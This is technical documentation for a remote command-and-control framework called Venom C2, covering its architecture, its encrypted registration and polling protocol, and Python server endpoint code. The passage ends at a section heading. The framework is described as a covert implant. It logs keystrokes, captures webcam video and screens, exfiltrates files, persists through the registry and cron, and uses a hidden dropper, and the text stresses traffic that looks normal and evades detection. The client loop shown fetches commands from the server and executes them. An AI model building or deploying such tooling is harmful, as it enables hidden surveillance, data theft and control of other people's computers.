# Complete Technical Documentation: Venom C2 Framework

## A Comprehensive Guide to the Remote Command & Control System

---

# Table of Contents

1. [Project Overview](#1-project-overview)
2. [System Architecture](#2-system-architecture)
3. [Core Components](#3-core-components)
4. [Server-Side Implementation](#4-server-side-implementation)
5. [Client-Side Implementation](#5-client-side-implementation)
6. [Native Code Components](#6-native-code-components)
7. [Security Architecture](#7-security-architecture)
8. [API Reference](#8-api-reference)
9. [Database Schema](#9-database-schema)
10. [Deployment Guide](#10-deployment-guide)
11. [Web Interface Guide](#11-web-interface-guide)
12. [Operational Features](#12-operational-features)
13. [Process Flows & Explanations](#13-process-flows--explanations)
14. [Troubleshooting & Maintenance](#14-troubleshooting--maintenance)
15. [Security Considerations](#15-security-considerations)
16. [Appendices](#16-appendices)

---

# 1. Project Overview

## 1.1 Introduction

**Venom C2 Framework** is a sophisticated, production-ready Command and Control (C2) system designed for remote client management, penetration testing, and red team operations. The framework provides a comprehensive suite of features including remote command execution, file transfer, screen sharing, video streaming, keylogging, and persistent agent deployment across Windows and Linux platforms.

### 1.1.1 What is a C2 Framework?

A Command and Control (C2) framework allows an operator (the "controller") to manage remote computers (called "agents" or "clients") from a central server. Think of it as a remote administration tool, but designed for security testing scenarios. The operator can:
- Execute commands on remote machines
- Capture screenshots and webcam photos
- Record video from the remote machine's camera
- Log keystrokes typed by the user
- Transfer files to and from the remote machine
- Watch the remote screen in real-time

### 1.1.2 Key Capabilities

| Feature Category | Specific Capabilities | Typical Use Case |
|-----------------|----------------------|-------------------|
| **Remote Control** | Interactive shell, command execution, directory navigation | Running system commands remotely |
| **Surveillance** | Screenshot capture, webcam photo capture, video recording | Capturing evidence of activity |
| **Monitoring** | Keylogging, screen sharing (live streaming), activity logging | Real-time user activity monitoring |
| **File Operations** | Upload to client, download from client, file explorer | Transferring tools or exfiltrating data |
| **Persistence** | Registry persistence (Windows), Cron job persistence (Linux) | Surviving system reboots |
| **Multi-Platform** | Windows (x86/x64) and Linux support | Cross-platform coverage |
| **Security** | AES-256-GCM encryption, RSA-2048 key exchange, JWT authentication | Protecting communications |

### 1.1.3 Technical Stack

```
┌─────────────────────────────────────────────────────────────────────────────────┐
│                           VENOM C2 FRAMEWORK                                    │
├─────────────────────────────────────────────────────────────────────────────────┤
│                                                                                 │
│  ┌─────────────────────────────────────────────────────────────────────────┐   │
│  │                           FRONTEND (Browser)                             │   │
│  │  ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌──────────┐      │   │
│  │  │Dashboard │ │ Terminal │ │Screenshare│ │  Video   │ │   Logs   │      │   │
│  │  │  HTML    │ │  iframe  │ │   HTML    │ │  Player  │ │  Viewer  │      │   │
│  │  └──────────┘ └──────────┘ └──────────┘ └──────────┘ └──────────┘      │   │
│  │                           TailwindCSS + JavaScript                       │   │
│  └─────────────────────────────────────────────────────────────────────────┘   │
│                                      │                                          │
│                                      ▼                                          │
│  ┌─────────────────────────────────────────────────────────────────────────┐   │
│  │                           BACKEND (Flask Server)                         │   │
│  │  ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌──────────┐      │   │
│  │  │   REST   │ │ Socket.IO│ │  JWT     │ │  AES/    │ │  File    │      │   │
│  │  │   API    │ │Real-time │ │  Auth    │ │  RSA     │ │  Upload  │      │   │
│  │  └──────────┘ └──────────┘ └──────────┘ └──────────┘ └──────────┘      │   │
│  │                         SQLAlchemy + SQLite                              │   │
│  └─────────────────────────────────────────────────────────────────────────┘   │
│                                      │                                          │
│                                      ▼                                          │
│  ┌─────────────────────────────────────────────────────────────────────────┐   │
│  │                           DATABASE (SQLite)                              │   │
│  │  ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌──────────┐      │   │
│  │  │  Admin   │ │ Client   │ │ Crypto   │ │ Commands │ │ Token    │      │   │
│  │  │  Table   │ │  Data    │ │  Keys    │ │   Log    │ │Blacklist │      │   │
│  │  └──────────┘ └──────────┘ └──────────┘ └──────────┘ └──────────┘      │   │
│  └─────────────────────────────────────────────────────────────────────────┘   │
│                                                                                 │
│  ┌─────────────────────────────────────────────────────────────────────────┐   │
│  │                           CLIENTS (Agents)                               │   │
│  │  ┌────────────────────────┐    ┌────────────────────────┐               │   │
│  │  │     WINDOWS Client     │    │      LINUX Client      │               │   │
│  │  │  Python + DLLs (video, │    │  Python + SOs (video,  │               │   │
│  │  │  photo) + Dropper.exe  │    │  photo) + Dropper      │               │   │
│  │  └────────────────────────┘    └────────────────────────┘               │   │
│  └─────────────────────────────────────────────────────────────────────────┘   │
│                                                                                 │
└─────────────────────────────────────────────────────────────────────────────────┘
```

---

# 2. System Architecture

## 2.1 High-Level Architecture Explanation

The Venom C2 Framework follows a **client-server architecture** where:

- **Server** (Flask application) acts as the central command post
- **Clients** (Python agents) run on target machines and await commands
- **Administrators** access the web dashboard to manage clients

### Communication Model: Pull-Based (Polling)

Unlike traditional C2 that uses reverse shells (client connects once and maintains open connection), Venom C2 uses a **pull-based model**:

```
Time 0s:    Client → Server: "Do you have any commands for me?"
Time 1s:    Server → Client: "No commands"
Time 2s:    Client sleeps
Time 5s:    Client → Server: "Do you have any commands for me?"
Time 5.1s:  Server → Client: "Yes, run 'whoami'"
Time 5.2s:  Client → Server: "Result: administrator"
Time 10s:   Client → Server: "Do you have any commands for me?"
...
```

**Why pull-based?** 
- Better for NAT traversal (client initiates all connections)
- No need for port forwarding on client side
- More stealthy (looks like normal web traffic)
- Resilient to network changes

**The trade-off:** 
- Slight delay (up to 5 seconds) between command issuance and execution
- Higher server load (handling frequent polls)

### Architecture Diagram

```
┌─────────────────────────────────────────────────────────────────────────────────────────────┐
│                                         INTERNET                                             │
│                                                                                             │
│  ┌─────────────────────────────────────────────────────────────────────────────────────┐   │
│  │                              C2 SERVER (venom.c2:5000)                               │   │
│  │                                                                                      │   │
│  │   ┌─────────────────┐    ┌─────────────────┐    ┌─────────────────┐                 │   │
│  │   │   Flask App     │    │   Socket.IO     │    │   SQLite DB     │                 │   │
│  │   │                 │    │   (Real-time)   │    │                 │                 │   │
│  │   │  • REST APIs    │◄──►│  • Live client  │    │  • Admin users  │                 │   │
│  │   │  • Command Q    │    │    updates      │    │  • Client data  │                 │   │
│  │   │  • File storage │    │  • Result push  │    │  • AES keys     │                 │   │
│  │   └────────┬────────┘    └────────┬────────┘    │  • Command logs │                 │   │
│  │            │                      │             └─────────────────┘                 │   │
│  │            │                      │                                                   │   │
│  │            ▼                      ▼                                                   │   │
│  │   ┌─────────────────────────────────────────────────────────────────────────────┐   │   │
│  │   │                         HTTPS / WSS (Port 5000)                              │   │   │
│  │   └─────────────────────────────────────────────────────────────────────────────┘   │   │
│  └─────────────────────────────────────────────────────────────────────────────────────┘   │
│                                              │                                              │
│                    ┌─────────────────────────┼─────────────────────────┐                   │
│                    │                         │                         │                   │
│                    ▼                         ▼                         ▼                   │
│  ┌────────────────────────────┐  ┌────────────────────────────┐  ┌────────────────────────┐│
│  │     WINDOWS CLIENT         │  │      LINUX CLIENT 1        │  │      LINUX CLIENT 2    ││
│  │                            │  │                            │  │                        ││
│  │  ┌──────────────────────┐  │  │  ┌──────────────────────┐  │  │  ┌──────────────────┐  ││
│  │  │   Python Agent       │  │  │  │   Python Agent       │  │  │  │  Python Agent    │  ││
│  │  │   • Polls every 5s   │  │  │  │   • Polls every 5s   │  │  │  │  • Polls every 5s│  ││
│  │  │   • Executes commands│  │  │  │   • Executes commands│  │  │  │  • Executes cmds │  ││
│  │  │   • Captures video   │  │  │  │   • Captures video   │  │  │  │  • Captures video│  ││
│  │  │     via DirectShow   │  │  │  │     via V4L2         │  │  │  │    via V4L2      │  ││
│  │  └──────────────────────┘  │  │  └──────────────────────┘  │  │  └──────────────────┘  ││
│  │           ▲                 │  │            ▲               │  │                       ││
│  │           │                 │  │            │               │  │                       ││
│  │  ┌────────┴────────┐        │  │  ┌─────────┴─────────┐     │  │                       ││
│  │  │ video_windows.dll│        │  │  │    video.so      │     │  │                       ││
│  │  │ photo_capture.dll│        │  │  │ photo_capture.so │     │  │                       ││
│  │  └─────────────────┘        │  │  └──────────────────┘     │  │                       ││
│  │                              │  │                            │  │                       ││
│  │  Persistence: Registry       │  │  Persistence: Cron Job     │  │                       ││
│  │  Dropper: dropper.exe        │  │  Dropper: dropper binary   │  │                       ││
│  └────────────────────────────┘  └────────────────────────────┘  └────────────────────────┘│
│                                                                                             │
└─────────────────────────────────────────────────────────────────────────────────────────────┘
```

## 2.2 Communication Flow: Step by Step

### Step 1: Client Registration (First-time Setup)

When a client runs for the first time, it has no configuration file. Here's what happens:

```
Client Machine                                C2 Server
     │                                            │
     │ 1. Client starts, checks for config file  │
     │    (/tmp/.rootconfig.ini on Linux or      │
     │     ~/rootconfig.ini on Windows)          │
     │                                            │
     │    Config file NOT found                   │
     │                                            │
     │ 2. Client gathers information:             │
     │    - Username (via whoami)                 │
     │    - Public IP (via api.ipify.org)         │
     │    - OS type (platform.system())           │
     │                                            │
     │ 3. Client sends registration POST request  │
     │    ─────────────────────────────────────▶  │
     │    POST /api/clientRegistration            │
     │    Body: {                                 │
     │      "user": "john_doe",                   │
     │      "public_ip": "203.0.113.45",          │
     │      "os": "Windows"                       │
     │    }                                       │
     │                                            │
     │                                  4. Server generates:
     │                                     - client_id (format: 
     │                                       "aB3xY9-20250115143022")
     │                                     - Checks for RSA keys
     │                                     - If missing, generates
     │                                       new 2048-bit RSA pair
     │                                     - Saves client to database
     │                                            │
     │ 5. Server responds with:                    │
     │    ◀─────────────────────────────────────   │
     │    Status: 201 Created                      │
     │    Body: {                                  │
     │      "client_id": "aB3xY9-20250115143022",  │
     │      "reg_date": "2025-01-15 14:30:22",     │
     │      "public_key": "-----BEGIN PUBLIC..."   │
     │    }                                        │
     │                                            │
     │ 6. Client saves to config file:             │
     │    {                                        │
     │      "client_id": "aB3xY9-20250115143022",  │
     │      "public_key": "-----BEGIN PUBLIC..."   │
     │    }                                        │
     │                                            │
```

### Step 2: AES Key Exchange (Secure Session Setup)

Now that the client has the server's public RSA key, it needs to establish a shared AES key for fast, secure communication:

```
Client Machine                                C2 Server
     │                                            │
     │ 1. Client generates random 256-bit AES key │
     │    (32 bytes) using get_random_bytes()     │
     │                                            │
     │ 2. Client creates JSON payload:             │
     │    {                                        │
     │      "client_id": "aB3xY9-20250115143022",  │
     │      "aes_key": "a1b2c3d4e5f6..." (hex)    │
     │    }                                       │
     │                                            │
     │ 3. Client encrypts payload with server's   │
     │    RSA public key using PKCS1_OAEP padding │
     │                                            │
     │    Why OAEP? OAEP (Optimal Asymmetric      │
     │    Encryption Padding) prevents certain    │
     │    cryptographic attacks on RSA.           │
     │                                            │
     │ 4. Client sends encrypted payload          │
     │    ─────────────────────────────────────▶  │
     │    POST /api/aes-share                     │
     │    Body: {                                 │
     │      "encrypted_payload": "hex_string..."  │
     │    }                                       │
     │                                            │
     │                                  5. Server loads RSA private
     │                                     key from .env file
     │                                            │
     │                                  6. Server decrypts payload
     │                                     using RSA private key
     │                                            │
     │                                  7. Server extracts:
     │                                     - client_id
     │                                     - aes_key (hex)
     │                                            │
     │                                  8. Server converts hex to
     │                                     bytes and stores in
     │                                     CryptographyData table
     │                                            │
     │ 9. Server confirms                          │
     │    ◀─────────────────────────────────────   │
     │    Status: 200 OK                           │
     │    Body: {"status": "AES key stored"}       │
     │                                            │
     │ 10. Client now has AES key for all future  │
     │     communications                          │
     │                                            │
```

**Why both RSA and AES?** 
- **RSA** is slow but great for securely exchanging small secrets (like an AES key)
- **AES** is fast (thousands of times faster) for encrypting large amounts of data
- Combined: Use RSA to securely share an AES key, then use AES for all actual communication

### Step 3: Command Polling (The Heartbeat)

Every 5 seconds, each client checks with the server for new commands:

```
Client Machine                                C2 Server
     │                                            │
     │ 1. Client sends GET request                 │
     │    ─────────────────────────────────────▶  │
     │    GET /command-transmission-to-client     │
     │    ?clientID=aB3xY9-20250115143022         │
     │                                            │
     │                                  2. Server finds client
     │                                     in database
     │                                            │
     │                                  3. Server updates client's
     │                                     last_active timestamp
     │                                            │
     │                                  4. Server checks for:
     │                                     - Individual command
     │                                     - Multicast command
     │                                       (5-second window)
     │                                            │
     │                              Case A: No command waiting
     │                                  5a. Server responds:
     │    ◀─────────────────────────────────────   │
     │    {"command": null}                        │
     │                                            │
     │                              Case B: Command waiting
     │                                  5b. Server encrypts command
     │                                     with client's AES key
     │                                  6b. Server responds:
     │    ◀─────────────────────────────────────   │
     │    Encrypted JSON: {                        │
     │      "nonce": "...",                        │
     │      "ciphertext": "...",                   │
     │      "tag": "..."                           │
     │    }                                        │
     │                                            │
     │ 7. Client decrypts response with AES key   │
     │                                            │
     │ 8. Client executes the command             │
     │    (e.g., runs 'whoami' in shell)          │
     │                                            │
```

### Step 4: Command Execution and Result Reporting

After executing a command, the client sends the result back:

```
Client Machine                                C2 Server
     │                                            │
     │ 1. Client captures command output          │
     │    (stdout or stderr)                      │
     │                                            │
     │ 2. Client creates result JSON:              │
     │    {                                        │
     │      "command": "whoami",                   │
     │      "result": "john_doe\\n",               │
     │      "client_id": "aB3xY9..."               │
     │    }                                       │
     │                                            │
     │ 3. Client encrypts with AES key            │
     │                                            │
     │ 4. Client encodes as Base64 (for safe      │
     │    transmission in HTTP form data)         │
     │                                            │
     │ 5. Client sends POST request               │
     │    ─────────────────────────────────────▶  │
     │    POST /execution-result-of-command-      │
     │         from-client?clientID=...           │
     │    Body: encrypted_base64_data             │
     │                                            │
     │                                  6. Server decrypts result
     │                                     using client's AES key
     │                                            │
     │                                  7. Server logs to database:
     │                                     INSERT INTO commands_log
     │                                     (client_id, 
     │                                      command_initiator,
     │                                      commands_history)
     │                                            │
     │                                  8. Server broadcasts via
     │                                     Socket.IO to all
     │                                     connected admin dashboards
     │                                            │
     │                                  9. Server confirms
     │    ◀─────────────────────────────────────   │
     │    {"status": "Result received"}            │
     │                                            │
```

### Step 5: Real-time Dashboard Updates (Socket.IO)

While HTTP polling handles command/response, WebSocket (Socket.IO) provides real-time updates:

```
Admin Browser (Dashboard)                     C2 Server
     │                                            │
     │ 1. User logs in, dashboard loads           │
     │                                            │
     │ 2. JavaScript connects WebSocket:          │
     │    socket = io('https://venom.c2:5000')   │
     │    ─────────────────────────────────────▶  │
     │                                  3. Server accepts connection
     │                                            │
     │                                  4. Background thread sends
     │                                     client list every 3 seconds
     │    ◀─────────────────────────────────────   │
     │    Socket event: 'all_client_list'         │
     │    Data: {                                  │
     │      "type": "full_update",                 │
     │      "clients": [...]                       │
     │    }                                       │
     │                                            │
     │ 5. Browser updates client table            │
     │                                            │
     │                                  6. When command result arrives
     │                                     (from client POST)
     │                                  7. Server emits:
     │    ◀─────────────────────────────────────   │
     │    Socket event: 'command_result'           │
     │    Data: {                                  │
     │      "client_id": "...",                    │
     │      "command": "whoami",                   │
     │      "result": "john_doe"                   │
     │    }                                       │
     │                                            │
     │ 8. Terminal iframe receives and displays   │
     │    the result immediately                   │
     │                                            │
```

---

# 3. Core Components

## 3.1 Component Overview

The Venom C2 Framework consists of several distinct components, each with a specific responsibility:

```
┌─────────────────────────────────────────────────────────────────────────────────────┐
│                              COMPONENT ARCHITECTURE                                  │
├─────────────────────────────────────────────────────────────────────────────────────┤
│                                                                                     │
│  ┌─────────────────────────────────────────────────────────────────────────────┐   │
│  │                         SERVER COMPONENTS                                    │   │
│  ├─────────────────────────────────────────────────────────────────────────────┤   │
│  │                                                                             │   │
│  │  ┌───────────────┐  ┌───────────────┐  ┌───────────────┐  ┌─────────────┐  │   │
│  │  │   Flask App   │  │   Socket.IO   │  │   SQLAlchemy  │  │    JWT      │  │   │
│  │  │  (app.py)     │  │  (Real-time)  │  │   (ORM)       │  │  (Auth)     │  │   │
│  │  │               │  │               │  │               │  │             │  │   │
│  │  │ • API routes  │  │ • Live client │  │ • Database    │  │ • Token     │  │   │
│  │  │ • Command Q   │  │   updates     │  │   models      │  │   generation│  │   │
│  │  │ • File upload │  │ • Result push │  │ • Queries     │  │ • Validation│  │   │
│  │  └───────────────┘  └───────────────┘  └───────────────┘  └─────────────┘  │   │
│  │                                                                             │   │
│  │  ┌───────────────┐  ┌───────────────┐  ┌───────────────┐  ┌─────────────┐  │   │
│  │  │   PyCrypto    │  │   Templates   │  │   Uploads     │  │   Logging   │  │   │
│  │  │   (Encrypt)   │  │   (HTML/CSS)  │  │   Directory   │  │   System    │  │   │
│  │  │               │  │               │  │               │  │             │  │   │
│  │  │ • AES-256-GCM │  │ • Dashboard   │  │ • File store  │  │ • Command   │  │   │
│  │  │ • RSA-2048    │  │ • Terminal    │  │ • Download    │  │   history   │  │   │
│  │  │ • Key exchange│  │ • Screenshare │  │ • Upload      │  │ • Audit     │  │   │
│  │  └───────────────┘  └───────────────┘  └───────────────┘  └─────────────┘  │   │
│  └─────────────────────────────────────────────────────────────────────────────┘   │
│                                                                                     │
│  ┌─────────────────────────────────────────────────────────────────────────────┐   │
│  │                         CLIENT COMPONENTS                                   │   │
│  ├─────────────────────────────────────────────────────────────────────────────┤   │
│  │                                                                             │   │
│  │  ┌───────────────┐  ┌───────────────┐  ┌───────────────┐  ┌─────────────┐  │   │
│  │  │ Python Agent  │  │  Keylogger    │  │  Screen Cap   │  │  File       │  │   │
│  │  │ (client.py)   │  │  (Platform)   │  │  (mss)        │  │  Transfer   │  │   │
│  │  │               │  │               │  │               │  │             │  │   │
│  │  │ • Main loop   │  │ • Windows:    │  │ • Screenshot  │  │ • Download  │  │   │
│  │  │ • Command     │  │   keyboard    │  │ • Screen share│  │ • Upload    │  │   │
│  │  │   execution   │  │ • Linux: Xlib │  │   (live)      │  │   to server │  │   │
│  │  │ • Encryption  │  │ • Buffer &    │  │               │  │             │  │   │
│  │  │ • Persistence │  │   send thread │  │               │  │             │  │   │
│  │  └───────────────┘  └───────────────┘  └───────────────┘  └─────────────┘  │   │
│  │                                                                             │   │
│  │  ┌───────────────┐  ┌───────────────┐  ┌───────────────┐  ┌─────────────┐  │   │
│  │  │ Video Capture │  │ Photo Capture │  │  Persistence  │  │  Dropper    │  │   │
│  │  │ (Native)      │  │ (Native)      │  │  (Platform)   │  │  (C/Go)     │  │   │
│  │  │               │  │               │  │               │  │             │  │   │
│  │  │ • Windows:    │  │ • Windows:    │  │ • Windows:    │  │ • Downloads │  │   │
│  │  │   DirectShow  │  │   SampleGrab- │  │   Registry    │  │   full agent│  │   │
│  │  │ • Linux: V4L2 │  │   ber         │  │ • Linux: Cron │  │ • Executes  │  │   │
│  │  │ • MJPEG or    │  │ • Linux: V4L2 │  │   job         │  │   silently  │  │   │
│  │  │   raw frames  │  │   single      │  │               │  │ • Hides     │  │   │
│  │  │               │  │   frame       │  │               │  │   window    │  │   │
│  │  └───────────────┘  └───────────────┘  └───────────────┘  └─────────────┘  │   │
│  └─────────────────────────────────────────────────────────────────────────────┘   │
│                                                                                     │
└─────────────────────────────────────────────────────────────────────────────────────┘
```

## 3.2 Detailed Component Descriptions

### 3.2.1 Server Components

#### Flask Application (`app.py`)

The Flask application is the heart of the C2 server. It handles:
- **HTTP Routes**: All API endpoints for client communication and admin dashboard
- **Session Management**: Maintains command queues per client
- **File Storage**: Manages uploaded files from clients
- **Template Rendering**: Serves HTML pages for the web interface

**Why Flask?** Flask is lightweight, flexible, and has excellent ecosystem support. It's perfect for projects that need a web interface but don't require the overhead of Django.

#### Socket.IO Server

Socket.IO provides real-time, bidirectional communication between the server and admin browsers. Key features:
- **Automatic reconnection**: If connection drops, client automatically retries
- **Fallback transports**: Falls back to HTTP long-polling if WebSocket unavailable
- **Room support**: Can target specific clients (future enhancement)

**What does it do?** When a command result arrives, the server uses Socket.IO to instantly push it to all connected admin dashboards, so operators see results without refreshing the page.

#### SQLAlchemy ORM

SQLAlchemy is an Object-Relational Mapper that translates Python classes to database tables. Benefits:
- Write Python code instead of SQL queries
- Automatic parameter escaping (prevents SQL injection)
- Database agnostic (can switch from SQLite to PostgreSQL easily)

#### JWT Authentication

JWT (JSON Web Token) is used to authenticate admin users:
- After login, server returns a signed token
- Token includes user role (admin/superadmin) and expiration time
- Browser stores token as HTTP-only cookie (prevents XSS attacks)
- Each request checks token validity before processing

#### PyCryptodome

Provides cryptographic functions:
- AES-256-GCM for encrypting command/response data
- RSA-2048 for secure key exchange
- Random byte generation for nonces and AES keys

### 3.2.2 Client Components

#### Python Agent (`client.py`)

The main client script that runs on target machines. It is compiled into a standalone executable using Nuitka.

**Main Loop Logic:**
```python
while True:
    # Step 1: Poll server for commands
    response = requests.get(f"{SERVER_URL}/command-transmission-to-client?clientID={client_id}")
    
    # Step 2: Decrypt response (if command exists)
    if response contains command:
        decrypted_command = decrypt_data(aes_key, response_data)
        
        # Step 3: Execute command
        result = execute_system_command(decrypted_command)
        
        # Step 4: Encrypt and send result
        encrypted_result = encrypt_data(aes_key, result)
        send_to_server(encrypted_result)
    
    # Step 5: Wait before next poll
    time.sleep(5)
```

#### Keylogger Implementation

The keylogger captures every keystroke typed by the user. Different implementations for each OS:

**Windows**: Uses the `keyboard` library which hooks into Windows' low-level keyboard events. Every key press triggers a callback that records the character.

**Linux**: Uses Xlib to hook into the X11 window system's Record extension. This captures key events from the graphical session.

**Buffer Strategy**: Keystrokes are accumulated in a buffer. Every 10 seconds (or when buffer reaches a certain size), the buffer is encrypted and sent to the server. This reduces network traffic and makes detection harder.

#### Screen Capture (`mss` library)

The `mss` (Multiple Screen Shots) library is used for:
- **Single screenshots**: For the "Capture Screenshot" command
- **Continuous screen sharing**: Captures frames at specified FPS

How it works:
1. `mss.mss()` creates a screenshot object
2. `sct.grab(sct.monitors[1])` captures the primary monitor
3. `mss.tools.to_png()` converts raw RGB to PNG format
4. For screen sharing, this loops at the specified FPS

#### Video Capture (Native Code)

Video capture requires native code because Python libraries cannot directly access webcam hardware with enough performance.

**Windows (DirectShow)**:
- Uses Microsoft's DirectShow multimedia framework
- Finds first available video capture device
- Configures capture format (640x480 MJPEG at specified FPS)
- Records to temporary AVI file
- Sends file in chunks to maintain streaming illusion

**Linux (V4L2)**:
- Uses Video4Linux2 kernel API
- Opens `/dev/video0` device
- Sets MJPEG format (compressed, smaller bandwidth)
- Uses memory-mapped buffers for zero-copy access
- Each frame sent immediately via callback

**Why MJPEG?** Motion JPEG sends each frame as a complete JPEG image. This means:
- If a frame is lost, the next frame still works (unlike H.264)
- Simple to implement
- Decoding is easy in browsers (just display as image)

#### Persistence Mechanism

Ensures the agent restarts when the computer reboots:

**Windows**: Adds registry key to `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`. The value contains a command that checks for dropper.exe and executes it.

**Linux**: Adds cron job that runs every hour. The cron command checks for dropper binary and executes it.

**The Dropper Pattern**: The main agent doesn't add itself to persistence directly. Instead, it adds a lightweight "dropper" binary. This dropper's only job is to download and execute the full agent. This allows you to update the agent without changing the persistence mechanism.

#### File Transfer

**Download from Client** (Exfiltration):
- Admin sends command: `download /path/to/file`
- Client reads file from disk
- Encrypts file with AES key
- Sends via POST to `/api/download-files-from-client`
- Server saves to `uploads/` directory

**Upload to Client**:
- Admin uploads file via dashboard
- Server queues command with filename
- Client receives command, downloads encrypted file
- Decrypts and saves to current directory

---

# 4. Server-Side Implementation

## 4.1 Flask Application Deep Dive

### 4.1.1 Application Initialization Flow

When `app.py` starts, the following happens in sequence:

```
1. Import all modules
   ↓
2. Load environment variables (.env file)
   ↓
3. Create Flask app instance
   ↓
4. Configure database path
   ↓
5. Initialize SQLAlchemy
   ↓
6. Define database models (classes)
   ↓
7. Create database tables if not exists
   ↓
8. Add default superadmin if database is new
   ↓
9. Create directory structure (uploads/, KEYLOG_DIR/)
   ↓
10. Load RSA keys from .env, generate if missing
   ↓
11. Define all route handlers
   ↓
12. Configure Socket.IO
   ↓
13. Start background thread for client updates
   ↓
14. Run the app with SSL
```

### 4.1.2 Request Lifecycle

Every HTTP request to the C2 server follows this path:

```
Client Request
      │
      ▼
┌─────────────────────────────────────────────────────────────────┐
│ 1. SSL/TLS Termination                                          │
│    - Server decrypts HTTPS traffic using cert.pem/key.pem       │
└─────────────────────────────────────────────────────────────────┘
      │
      ▼
┌─────────────────────────────────────────────────────────────────┐
│ 2. Flask Routing                                                 │
│    - URL matched against defined routes                         │
│    - Example: /api/clientRegistration → client_registration()   │
└─────────────────────────────────────────────────────────────────┘
      │
      ▼
┌─────────────────────────────────────────────────────────────────┐
│ 3. Request Parsing                                               │
│    - JSON body parsed (request.get_json())                      │
│    - Query parameters extracted (request.args)                  │
│    - Form data processed (request.form)                         │
│    - File uploads handled (request.files)                       │
└─────────────────────────────────────────────────────────────────┘
      │
      ▼
┌─────────────────────────────────────────────────────────────────┐
│ 4. Authentication (if required)                                 │
│    - JWT token extracted from cookie                            │
│    - Token validated (signature, expiry, blacklist)             │
│    - User role extracted for authorization                      │
└─────────────────────────────────────────────────────────────────┘
      │
      ▼
┌─────────────────────────────────────────────────────────────────┐
│ 5. Business Logic                                                │
│    - Database queries (SQLAlchemy)                              │
│    - File operations                                            │
│    - Command queue updates                                      │
│    - Encryption/decryption                                      │
└─────────────────────────────────────────────────────────────────┘
      │
      ▼
┌─────────────────────────────────────────────────────────────────┐
│ 6. Response Generation                                           │
│    - JSON serialization                                         │
│    - Encryption (for client-targeted responses)                 │
│    - HTTP status code assignment                                │
└─────────────────────────────────────────────────────────────────┘
      │
      ▼
    Response
```

### 4.1.3 Key Endpoints Explained

#### Client Registration (`/api/clientRegistration`) - POST

**Purpose**: Register a new client and provide RSA public key for secure key exchange.

**What happens inside**:

```python
def client_registration():
    # 1. Get client-provided data
    data = request.get_json()
    user = data.get('user')          # e.g., "john_doe"
    ip = data.get('public_ip')       # e.g., "203.0.113.45"
    os_name = data.get('os')         # e.g., "Windows"
    
    # 2. Generate unique client ID
    # Format: 6 random chars + timestamp
    # Example: "aB3xY9-20250115143022"
    random_part = ''.join(random.choices(string.ascii_letters + string.digits, k=6))
    timestamp = datetime.datetime.now().strftime('%Y%m%d%H%M%S')
    client_id = f"{random_part}-{timestamp}"
    
    # 3. Get geographical location from IP
    # Uses ipinfo.io API to get city/region/country
    address = get_address(ip)  # e.g., "New York - New York - US"
    
    # 4. Create database record
    new_client = ClientData(
        client_id=client_id,
        user=user,
        nickname="nickname",  # placeholder, admin can change later
        ip=ip,
        os=os_name,
        registered_at=datetime.datetime.now(),
        last_active=datetime.datetime.now(),
        address=address
    )
    db.session.add(new_client)
    db.session.commit()
    
    # 5. Load or generate RSA keys
    public_key = os.getenv('PUBLIC_KEY_FOR_AES_KEY_EXCHANGE')
    if not public_key:
        # Generate new 2048-bit RSA key pair
        rsa_key = RSA.generate(2048)
        public_key = rsa_key.publickey().exportKey('PEM').decode()
        private_key = rsa_key.exportKey('PEM').decode()
        # Save to .env file for persistence across restarts
        append_to_env_file(public_key, private_key)
    
    # 6. Return client_id and public key
    return jsonify({
        "client_id": client_id,
        "reg_date": reg_date.strftime('%Y-%m-%d %H:%M:%S'),
        "public_key": public_key
    }), 201
```

**Why does the server generate RSA keys only once?** 
RSA key pairs are expensive to generate. The server creates them on first startup and reuses them for all clients. Each client gets the same public key, but each client has its own unique AES key for actual communication.

#### AES Key Exchange (`/api/aes-share`) - POST

**Purpose**: Receive and store client's AES session key.

**What happens inside**:

```python
def aes_share():
    # 1. Get encrypted payload from client
    data = request.get_json()
    encrypted_payload_hex = data.get('encrypted_payload')
    encrypted_payload = bytes.fromhex(encrypted_payload_hex)
    
    # 2. Load server's RSA private key
    private_key_pem = os.getenv('PRIVATE_KEY_FOR_AES_KEY_EXCHANGE')
    private_key = RSA.import_key(private_key_pem)
    
    # 3. Decrypt with RSA private key
    cipher_rsa = PKCS1_OAEP.new(private_key)
    decrypted_bytes = cipher_rsa.decrypt(encrypted_payload)
    decrypted_json = decrypted_bytes.decode('utf-8')
    
    # 4. Extract client_id and AES key
    payload = json.loads(decrypted_json)
    client_id = payload.get('client_id')
    aes_key_hex = payload.get('aes_key')
    aes_key = bytes.fromhex(aes_key_hex)
    
    # 5. Store AES key in database
    crypto_entry = CryptographyData.query.filter_by(client_id=client_id).first()
    if crypto_entry:
        crypto_entry.aes_key = aes_key  # Update existing
    else:
        crypto_entry = CryptographyData(client_id=client_id, aes_key=aes_key)
        db.session.add(crypto_entry)
    db.session.commit()
    
    return jsonify({"status": "AES key stored successfully"}), 200
```

**Security note**: The AES key is stored in the database as raw bytes. In a production environment, you might want to encrypt this at rest as well.

#### Command Polling (`/command-transmission-to-client`) - GET

**Purpose**: Client checks for new commands; server returns encrypted command if available.

**What happens inside**:

```python
def receive_command():
    # 1. Get client ID from query parameter
    client_id = request.args.get('clientID')
    
    # 2. Update client's last_active timestamp
    client = ClientData.query.filter_by(client_id=client_id).first()
    if client:
        client.last_active = datetime.datetime.now()
        db.session.commit()
    
    # 3. Check for multicast commands (broadcast to all clients of same OS)
    os_name = client.os
    multicast_info = multicast_commands.get(os_name, {})
    multicast_cmd = multicast_info.get("command")
    multicast_time = multicast_info.get("timestamp")
    
    # Multicast commands are only available for 5 seconds after being set
    if multicast_cmd and multicast_time:
        if (datetime.datetime.now() - multicast_time) <= timedelta(seconds=5):
            command_to_execute[client_id] = multicast_cmd
    
    # 4. Check if this client has a queued command
    if client_id in command_to_execute:
        command = command_to_execute.pop(client_id)  # Remove after reading
        
        # 5. Encrypt command with client's AES key
        aes_key = get_aes_key_by_client_id(client_id)
        command_dict = {"command": command}
        encrypted = encrypt_data(aes_key, json.dumps(command_dict))
        
        return encrypted  # Returns the encrypted JSON
    
    # 6. No command available
    return jsonify({"command": None})
```

**Why remove the command after reading?** 
Commands are one-time use. Once a client picks up a command, it shouldn't be available again (prevents duplicate execution).

#### Command Result Reception (`/execution-result-of-command-from-client`) - POST

